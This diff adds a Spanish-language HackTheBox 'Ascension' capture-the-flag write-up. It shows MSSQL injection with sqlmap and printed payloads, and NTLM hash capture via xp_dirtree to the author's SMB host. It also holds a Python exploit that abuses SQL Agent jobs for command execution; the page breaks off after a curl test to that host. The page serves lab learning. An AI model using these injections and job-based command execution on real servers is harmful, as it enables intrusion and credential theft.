@@ -1,0 +1,2009 @@
+<!DOCTYPE html>
+<html><head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Ascension</title>
+
+  <meta name="description" content="Resolución del endgame Ascension de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Ascension">
+  <meta name="twitter:description" content="Resolución del endgame Ascension de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="/images/htb/ascension.png">
+
+  <meta property="og:site_name" content="GatoGamer1155">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Ascension">
+  <meta property="og:description" content="Resolución del endgame Ascension de la plataforma de HackTheBox">
+  <meta property="og:image" content="/images/htb/ascension.png">
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/htb/ascension.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Ascension" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover panel-cover--collapsed" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/endgames" title="GatoGamer1155" class="blog-button">EndGames</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#flag1">Takeoff</a></li>
+        <li><a href="#flag2">Intercept</a></li>
+        <li><a href="#flag3">Contrails</a></li>
+        <li><a href="#flag4">Wingman</a></li>
+        <li><a href="#flag5">Corridor</a></li>
+        <li><a href="#flag6">Upgrade</a></li>
+        <li><a href="#flag7">Maverick</a></li>
+        <li><a href="#extra1">Extra 1</a></li>
+        <li><a href="#extra2">Extra 2</a></li>
+        <li><a href="#extra3">Extra 3</a></li>
+        <li><a href="#extra4">Extra 4</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="/images/htb/ascension.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"></picture>
+    <h2 class="post-title">Ascension</h2><br>
+  </header>
+  
+<section class="post" id="flag1">
+<br><h3 class="post-title">Chasm</h3>
+<h4 class="post-title">ASCENSION{y0ur_4gent_is_oUr_aG3n7}</h4><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos solo un puerto abierto, el <code class="language-plaintext highlighter-rouge">80</code> que es un servicio web por <code class="language-plaintext highlighter-rouge">http</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ nmap </span><span class="p">10.13.38.20
+Nmap scan report for 10.13.38.20  
+PORT   STATE SERVICE
+80/tcp open  http</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que es el unico puerto abierto podemos dar un vistazo a la <code class="language-plaintext highlighter-rouge">web</code>, la cual parece una página de aerolinas, en ella encontramos un boton para <code class="language-plaintext highlighter-rouge">reservar</code> un vuelo</p>
+<a href="/endgames/ascension/1.png" target="_blank"><div><p><img src="/endgames/ascension/1.png"></p></div></a>   
+
+<p class="plain-text">En la pagina de reservacion podemos ingresar algunos <code class="language-plaintext highlighter-rouge">datos</code> para posibles vuelos</p>
+<a href="/endgames/ascension/2.png" target="_blank"><div><p><img src="/endgames/ascension/2.png"></p></div></a>
+
+<p class="plain-text">Al enviar una <code class="language-plaintext highlighter-rouge">'</code> en el primer campo recibimos un error de <code class="language-plaintext highlighter-rouge">Mssql</code>, por lo que muy probablemente podriamos derivarlo a una <code class="language-plaintext highlighter-rouge">sql injection</code> aprovechando el error</p>
+<a href="/endgames/ascension/3.png" target="_blank"><div><p><img src="/endgames/ascension/3.png"></p></div></a>
+
+<p class="plain-text">Para ahorrar tiempo usaremos <code class="language-plaintext highlighter-rouge">sqlmap</code>, iniciaremos pasandole la data donde se tramita la vulnerabilidad y con el parametro <code class="language-plaintext highlighter-rouge">-dbs</code> dumpeamos los nombres de todas las <code class="language-plaintext highlighter-rouge">bases de datos</code>, sin embargo en ellas no encontramos nada muy intersante</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ sqlmap </span><span class="p">--batch --url http://10.13.38.20/book-trip.php --data </span><span class="am">"destination=test"</span><span class="p"> -dbs
+</span><span class="am">        ___
+       __H__
+ ___ ___[</span><span class="ro">.</span><span class="am">]_____ ___ ___  </span><span class="p">{</span><span class="c1">1.7.8#stable</span><span class="p">}</span><span class="am">
+|_ -| . [</span><span class="ro">'</span><span class="am">]     | .'| . |
+|___|_  [</span><span class="ro">'</span><span class="am">]_|_|_|__,|  _|
+      |_|</span><span class="am">V</span><span class="am">...       |_|   </span><span class="p">https://sqlmap.org
+
+[</span><span class="az">18:18:36</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resuming back-end DBMS 'microsoft sql server' 
+[</span><span class="az">18:18:36</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: destination (POST)
+    Type: error-based
+    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
+    Payload: destination=test' AND 5908 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(107)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (5908=5908) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(98)+CHAR(106)+CHAR(113)))-- OSNd  
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: destination=test';WAITFOR DELAY '0:0:5'--
+
+    Type: time-based blind
+    Title: Microsoft SQL Server/Sybase time-based blind (IF)
+    Payload: destination=test' WAITFOR DELAY '0:0:5'-- DCiP
+---
+[</span><span class="az">18:18:37</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] the back-end DBMS is Microsoft SQL Server
+[</span><span class="az">18:18:37</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching database names
+[</span><span class="az">18:18:38</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: 'daedalus'
+[</span><span class="az">18:18:39</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: 'logs'
+[</span><span class="az">18:18:39</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: 'master'
+[</span><span class="az">18:18:40</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: 'model'
+[</span><span class="az">18:18:40</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: 'msdb'
+[</span><span class="az">18:18:41</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: 'tempdb'
+available databases [6]:
+[*] daedalus
+[*] logs
+[*] master
+[*] model
+[*] msdb
+[*] tempdb</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con el parametro <code class="language-plaintext highlighter-rouge">--users</code> podemos dumpear los usuarios relacionados con la db</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ sqlmap </span><span class="p">--batch --url http://10.13.38.20/book-trip.php --data </span><span class="am">"destination=test"</span><span class="p"> --users  
+</span><span class="am">        ___
+       __H__
+ ___ ___[</span><span class="ro">.</span><span class="am">]_____ ___ ___  </span><span class="p">{</span><span class="c1">1.7.8#stable</span><span class="p">}</span><span class="am">
+|_ -| . [</span><span class="ro">'</span><span class="am">]     | .'| . |
+|___|_  [</span><span class="ro">'</span><span class="am">]_|_|_|__,|  _|
+      |_|</span><span class="am">V</span><span class="am">...       |_|   </span><span class="p">https://sqlmap.org
+
+[</span><span class="az">14:24:47</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resuming back-end DBMS 'microsoft sql server' 
+[</span><span class="az">14:24:47</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] testing connection to the target URL
+[</span><span class="az">14:24:48</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] the back-end DBMS is Microsoft SQL Server
+[</span><span class="az">14:24:48</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching database user'
+database management system users [18]:
+[*] ##MS_AgentSigningCertificate##
+[*] ##MS_PolicyEventProcessingLogin##
+[*] ##MS_PolicySigningCertificate##
+[*] ##MS_PolicyTsqlExecutionLogin##
+[*] ##MS_SmoExtendedSigningCertificate##
+[*] ##MS_SQLAuthenticatorCertificate##
+[*] ##MS_SQLReplicationSigningCertificate##
+[*] ##MS_SQLResourceSigningCertificate##
+[*] daedalus
+[*] daedalus_admin
+[*] NT AUTHORITY\\SYSTEM
+[*] NT Service\\MSSQLSERVER
+[*] NT SERVICE\\SQLSERVERAGENT
+[*] NT SERVICE\\SQLTELEMETRY
+[*] NT SERVICE\\SQLWriter
+[*] NT SERVICE\\Winmgmt
+[*] sa
+[*] WEB01\\svc_dev</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para ejecutar nuestras propias <code class="language-plaintext highlighter-rouge">querys</code> y tener mas control sobre lo que ejecutamos usaremos <code class="language-plaintext highlighter-rouge">--sql-shell</code> que nos otorgara una consola para enviar las querys</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ sqlmap </span><span class="p">--batch --url http://10.13.38.20/book-trip.php --data </span><span class="am">"destination=test" </span><span class="p">--sql-shell
+</span><span class="am">        ___
+       __H__
+ ___ ___[</span><span class="ro">.</span><span class="am">]_____ ___ ___  </span><span class="p">{</span><span class="c1">1.7.8#stable</span><span class="p">}</span><span class="am">
+|_ -| . [</span><span class="ro">'</span><span class="am">]     | .'| . |
+|___|_  [</span><span class="ro">'</span><span class="am">]_|_|_|__,|  _|
+      |_|</span><span class="am">V</span><span class="am">...       |_|   </span><span class="p">https://sqlmap.org
+
+[</span><span class="az">18:19:09</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resuming back-end DBMS 'microsoft sql server' 
+[</span><span class="az">18:19:09</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] testing connection to the target URL
+[</span><span class="az">18:19:10</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] the back-end DBMS is Microsoft SQL Server
+[</span><span class="az">18:19:10</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] calling Microsoft SQL Server shell. To quit type 'x' or 'q' and press ENTER  
+sql-shell&gt; select suser_name();
+[</span><span class="az">18:22:19</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching SQL SELECT statement query output: 'select suser_name()'
+[</span><span class="az">18:22:20</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: 'daedalus'
+select suser_name(): 'daedalus'
+sql-shell&gt; host_name();
+[</span><span class="az">18:25:12</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching SQL query output: 'host_name()'
+[</span><span class="az">18:25:12</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: 'WEB01'
+host_name(): 'WEB01'
+sql-shell&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Como curiosidad aunque en este caso no nos sirve de nada si usamos <code class="language-plaintext highlighter-rouge">xp_dirtree</code> hacia un recurso <code class="language-plaintext highlighter-rouge">smb</code> podemos capturar el hash NTLMv2 de el equipo <code class="language-plaintext highlighter-rouge">WEB01$</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">sql-shell&gt; exec xp_dirtree '\\10.10.14.10\kali'
+[</span><span class="az">18:23:48</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] executing SQL data execution statement: 'exec xp_dirtree '\\10.10.14.10\kali''  
+exec xp_dirtree '\\10.10.14.10\kali': 'NULL'
+sql-shell&gt;</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ impacket-smbserver </span><span class="p">kali . -smb2support
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.13.38.20,56583)
+[*] AUTHENTICATE_MESSAGE (DAEDALUS\WEB01$,WEB01)
+[*] User WEB01\WEB01$ authenticated successfully
+[*] WEB01$::DAEDALUS:aaaaaaaaaaaaaaaa:dca15cfab9d811eed94ea3b3e412ac10:010100000000000000c24b936adcd9012f62a36cd4aedc85000000000100100055004200530064007a0071004e0042000300100055004200530064007a0071004e0042000200100068006d00580074005700450047006b000400100068006d00580074005700450047006b000700080000c24b936adcd90106000400020000000800300030000000000000000000000000300000d42bd6976d05dbb7e4b3b1ceef1292ea608ef946bcbe54d8b8726f58fb118d660a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0034000000000000000000  
+[*] Closing down connection (10.13.38.20,56583)
+[*] Remaining connections []</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Creamos una tabla llamada <code class="language-plaintext highlighter-rouge">roles</code> con las columnas <code class="language-plaintext highlighter-rouge">username</code> y <code class="language-plaintext highlighter-rouge">rolename</code> en donde basandonos en la <a href="https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-database-role-members-transact-sql?view=sql-server-ver15#example">documentacion</a> ingresaremos los nombres y <code class="language-plaintext highlighter-rouge">roles</code> de los miembros de la base de datos para despues dumpearlos y ver toda la informacion</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">sql-shell&gt; create table roles ([username] sysname, [rolename] sysname)
+[</span><span class="az">14:35:33</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] executing SQL data definition statement: 'create table roles ([username] sysname, [rolename] sysname)'
+create table roles ([username] sysname, [rolename] sysname): 'NULL'
+sql-shell&gt; insert into roles (username, rolename) select isnull (dp1.name, 'no members') as databaseusername, dp2.name as databaserolename from msdb.sys.database_role_members as drm left outer join msdb.sys.database_principals as dp1 on drm.member_principal_id = dp1.principal_id right outer join msdb.sys.database_principals as dp2 on drm.role_principal_id = dp2.principal_id where dp2.type = 'r' order by dp1.name
+[</span><span class="az">14:35:34</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] executing SQL data manipulation statement: 'insert into roles (username, rolename) select isnull (dp1.name, 'no members') as databaseusername, dp2.name as databaserolename from msdb.sys.database_role_members as drm left outer join msdb.sys.database_principals as dp1 on drm.member_principal_id = dp1.principal_id right outer join msdb.sys.database_principals as dp2 on drm.role_principal_id = dp2.principal_id where dp2.type = 'r' order by dp1.name'  
+insert into roles (username, rolename) select isnull (dp1.name, 'no members') as databaseusername, dp2.name as databaserolename from msdb.sys.database_role_members as drm left outer join msdb.sys.database_principals as dp1 on drm.member_principal_id = dp1.principal_id right outer join msdb.sys.database_principals as dp2 on drm.role_principal_id = dp2.principal_id where dp2.type = 'r' order by dp1.name: 'NULL'
+sql-shell&gt; </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Una vez ingresamos esos datos en la tabla <code class="language-plaintext highlighter-rouge">roles</code> dumpeamos la tabla roles y vemos algunas cosas entre ellas a <code class="language-plaintext highlighter-rouge">daedalus_admin</code> con el rol <code class="language-plaintext highlighter-rouge">SQLAgentUserRole</code> que si miramos la <a href="https://learn.microsoft.com/en-us/sql/ssms/agent/sql-server-agent-fixed-database-roles?view=sql-server-ver15">documentacion</a> nos dice que tiene la capacidad de crear y ejecutar <code class="language-plaintext highlighter-rouge">jobs</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ sqlmap </span><span class="p">--batch --url http://10.13.38.20/book-trip.php --data </span><span class="am">"destination=test" </span><span class="p">-D daedalus -T roles -dump  
+</span><span class="am">        ___
+       __H__
+ ___ ___[</span><span class="ro">.</span><span class="am">]_____ ___ ___  </span><span class="p">{</span><span class="c1">1.7.8#stable</span><span class="p">}</span><span class="am">
+|_ -| . [</span><span class="ro">'</span><span class="am">]     | .'| . |
+|___|_  [</span><span class="ro">'</span><span class="am">]_|_|_|__,|  _|
+      |_|</span><span class="am">V</span><span class="am">...       |_|   </span><span class="p">https://sqlmap.org
+
+Database: daedalus
+Table: roles
+[39 entries]
++------------------------------+-----------------------------------+
+| rolename                     | username                          |
++------------------------------+-----------------------------------+
+| public                       | No members                        |
+| TargetServersRole            | No members                        |
+| SQLAgentUserRole             | SQLAgentReaderRole                |
+| SQLAgentUserRole             | dc_operator                       |
+| SQLAgentUserRole             | MS_DataCollectorInternalUser      |
+| SQLAgentUserRole             | daedalus_admin                    |
+| SQLAgentUserRole             | WEB01\\svc_dev                    |
+| SQLAgentReaderRole           | SQLAgentOperatorRole              |
+| SQLAgentReaderRole           | daedalus_admin                    |
+| SQLAgentReaderRole           | WEB01\\svc_dev                    |
+| SQLAgentOperatorRole         | PolicyAdministratorRole           |
+| SQLAgentOperatorRole         | daedalus_admin                    |
+| SQLAgentOperatorRole         | WEB01\\svc_dev                    |
+| DatabaseMailUserRole         | No members                        |
+| db_ssisadmin                 | No members                        |
+| db_ssisltduser               | dc_operator                       |
+| db_ssisltduser               | dc_proxy                          |
+| db_ssisoperator              | dc_operator                       |
+| db_ssisoperator              | dc_proxy                          |
+| db_ssisoperator              | MS_DataCollectorInternalUser      |
+| dc_operator                  | dc_admin                          |
+| dc_admin                     | MS_DataCollectorInternalUser      |
+| dc_proxy                     | No members                        |
+| PolicyAdministratorRole      | ##MS_PolicyEventProcessingLogin## |
+| PolicyAdministratorRole      | ##MS_PolicyTsqlExecutionLogin##   |
+| ServerGroupAdministratorRole | No members                        |
+| ServerGroupReaderRole        | ServerGroupAdministratorRole      |
+| UtilityCMRReader             | No members                        |
+| UtilityIMRWriter             | No members                        |
+| UtilityIMRReader             | UtilityIMRWriter                  |
+| db_owner                     | dbo                               |
+| db_accessadmin               | No members                        |
+| db_securityadmin             | No members                        |
+| db_ddladmin                  | No members                        |
+| db_backupoperator            | No members                        |
+| db_datareader                | No members                        |
+| db_datawriter                | No members                        |
+| db_denydatareader            | No members                        |
+| db_denydatawriter            | No members                        |
++------------------------------+-----------------------------------+</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora enumeraremos usuarios a los que nuestro usuario actual pueda <code class="language-plaintext highlighter-rouge">suplantar</code>, para esto creamos una tabla <code class="language-plaintext highlighter-rouge">grants</code> donde depositaremos los nombres de usuario, esto podemos hacerlo facilmente ayudandonos de un <a href="https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/#find">articulo</a> que nos explica</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">sql-shell&gt; create table grants (username varchar(1024))
+[</span><span class="az">14:39:19</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] executing SQL data definition statement: 'create table grants (username varchar(1024))'
+create table grants (username varchar(1024)): 'NULL'
+sql-shell&gt; insert into grants (username) select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'impersonate'
+[</span><span class="az">14:39:30</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] executing SQL data manipulation statement: 'insert into grants (username) select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'impersonate''  
+insert into grants (username) select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'impersonate': 'NULL'
+sql-shell&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Dumpeamos la tabla <code class="language-plaintext highlighter-rouge">grants</code> y encontramos solo al usuario <code class="language-plaintext highlighter-rouge">daedalus_admin</code>, esto significa que podremos <code class="language-plaintext highlighter-rouge">suplantar</code> a este usuario para ejecutar nuestra query</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ sqlmap </span><span class="p">--batch --url http://10.13.38.20/book-trip.php --data </span><span class="am">"destination=test" </span><span class="p">-D daedalus -T grants -dump  
+</span><span class="am">        ___
+       __H__
+ ___ ___[</span><span class="ro">.</span><span class="am">]_____ ___ ___  </span><span class="p">{</span><span class="c1">1.7.8#stable</span><span class="p">}</span><span class="am">
+|_ -| . [</span><span class="ro">'</span><span class="am">]     | .'| . |
+|___|_  [</span><span class="ro">'</span><span class="am">]_|_|_|__,|  _|
+      |_|</span><span class="am">V</span><span class="am">...       |_|   </span><span class="p">https://sqlmap.org
+
+Database: daedalus
+Table: grants
+[1 entry]
++----------------+
+| username       |
++----------------+
+| daedalus_admin |
++----------------+</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Solo para comprobar creamos una tabla llamada <code class="language-plaintext highlighter-rouge">proxy</code> donde depositaremos el resultado de la query <code class="language-plaintext highlighter-rouge">sp_help_proxy</code> ejecutada bajo el usuario <code class="language-plaintext highlighter-rouge">daedalus_admin</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">sql-shell&gt; create table proxy ([proxy_id] int, [name] sysname, [credential_identity] sysname, [enabled] tinyint, [description] nvarchar(1024), [user_sid] varbinary(85), [credential_id] int, [credential_identity_exists] int)
+[</span><span class="az">14:42:28</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] executing SQL data definition statement: 'create table proxy ([proxy_id] int, [name] sysname, [credential_identity] sysname, [enabled] tinyint, [description] nvarchar(1024), [user_sid] varbinary(85), [credential_id] int, [credential_identity_exists] int)'  
+create table proxy ([proxy_id] int, [name] sysname, [credential_identity] sysname, [enabled] tinyint, [description] nvarchar(1024), [user_sid] varbinary(85), [credential_id] int, [credential_identity_exists] int): 'NULL'
+sql-shell&gt; exec as login = n'daedalus_admin'; insert into proxy exec msdb.dbo.sp_help_proxy
+[</span><span class="az">14:42:47</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] executing SQL data execution statement: 'exec as login = N'daedalus_admin'; insert into proxy exec msdb.dbo.sp_help_proxy'
+exec as login = N'daedalus_admin'; insert into proxy exec msdb.dbo.sp_help_proxy: 'NULL'
+sql-shell&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Dumpeamos la tabla <code class="language-plaintext highlighter-rouge">proxy</code> y como credencial podemos encontrar la de <code class="language-plaintext highlighter-rouge">svc_dev</code> que en su descripcion dice que tiene acceso a ejecutar <code class="language-plaintext highlighter-rouge">CmdExec</code> y Powershell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ sqlmap </span><span class="p">--batch --url http://10.13.38.20/book-trip.php --data </span><span class="am">"destination=test" </span><span class="p">-D daedalus -T proxy -dump
+</span><span class="am">        ___
+       __H__
+ ___ ___[</span><span class="ro">.</span><span class="am">]_____ ___ ___  </span><span class="p">{</span><span class="c1">1.7.8#stable</span><span class="p">}</span><span class="am">
+|_ -| . [</span><span class="ro">'</span><span class="am">]     | .'| . |
+|___|_  [</span><span class="ro">'</span><span class="am">]_|_|_|__,|  _|
+      |_|</span><span class="am">V</span><span class="am">...       |_|   </span><span class="p">https://sqlmap.org
+
+Database: daedalus
+Table: proxy
+[1 entry]
++----------+-------------------+---------------+---------+---------+-------------------------------------------------------------+---------------------+----------------------------+
+| proxy_id | user_sid          | credential_id | name    | enabled | description                                                 | credential_identity | credential_identity_exists |
++----------+-------------------+---------------+---------+---------+-------------------------------------------------------------+---------------------+----------------------------+
+| 1        | ?..?\x15.???????. | 65537         | svc_dev | 1       | Allow user to access the CmdExec and Powershell subsystems. | WEB01\\svc_dev      | 1                          |
++----------+-------------------+---------------+---------+---------+-------------------------------------------------------------+---------------------+----------------------------+  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Apoyandonos de esta <a href="https://www.optiv.com/explore-optiv-insights/blog/mssql-agent-jobs-command-execution">investigacion</a> podemos crear un pequeño <code class="language-plaintext highlighter-rouge">script</code> en python que nos automatize una ejecucion de comandos solo a través de <code class="language-plaintext highlighter-rouge">jobs</code> donde sabemos que el usuario <code class="language-plaintext highlighter-rouge">daedalus_admin</code> que suplantamos tiene privilegios</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span><span class="o">import </span><span class="p">sys, random, string, requests
+
+</span><span class="o">if </span><span class="no">len</span><span class="p">(sys.argv) </span><span class="o">&lt; </span><span class="mi">2</span><span class="p">:
+    </span><span class="no">print</span><span class="p">(</span><span class="no">f</span><span class="s">"Usage: python3 </span><span class="p">{sys.argv[0]}</span><span class="s"> &lt;command&gt;"</span><span class="p">)
+    sys.exit(</span><span class="mi">1</span><span class="p">)
+
+command </span><span class="o">= </span><span class="p">sys.argv[</span><span class="mi">1</span><span class="p">]
+target </span><span class="o">= </span><span class="s">"http://10.13.38.20/book-trip.php"</span><span class="p">
+name </span><span class="o">= </span><span class="s">""</span><span class="p">.join(random.choices(string.ascii_lowercase, k</span><span class="o">=</span><span class="mi">8</span><span class="p">))
+
+query </span><span class="o">=</span><span class="no"> f</span><span class="s">"""
+use msdb;
+exec as login = N'daedalus_admin';
+exec msdb.dbo.sp_add_job @job_name = N'</span><span class="p">{name}</span><span class="s">_job';
+exec msdb.dbo.sp_add_jobstep @job_name = N'</span><span class="p">{name}</span><span class="s">_job', @step_name = N'</span><span class="p">{name}</span><span class="s">_step', @subsystem = N'cmdexec', @command = N'C:</span><span class="mi">\\</span><span class="s">Windows</span><span class="mi">\\</span><span class="s">System32</span><span class="mi">\\</span><span class="s">cmd.exe /c </span><span class="p">{command}</span><span class="s">', @retry_attempts = 1, @retry_interval = 5, @proxy_id = 1;  
+exec msdb.dbo.sp_add_jobserver @job_name = N'</span><span class="p">{name}</span><span class="s">_job';
+exec msdb.dbo.sp_start_job @job_name = N'</span><span class="p">{name}</span><span class="s">_job';
+"""</span><span class="p">
+
+data </span><span class="o">=</span><span class="p"> {</span><span class="s">"destination"</span><span class="p">: </span><span class="no">f</span><span class="s">"'; </span><span class="p">{query}</span><span class="s">-- -"</span><span class="p">}
+requests.post(target, data</span><span class="o">=</span><span class="p">data)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para comprobar que funciona podemos enviar un simple <code class="language-plaintext highlighter-rouge">curl</code> y recibimos la peticion</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ python3 </span><span class="p">exploit.py </span><span class="am">'curl 10.10.14.10'  </span>
+</code></pre></div></div><br>
+
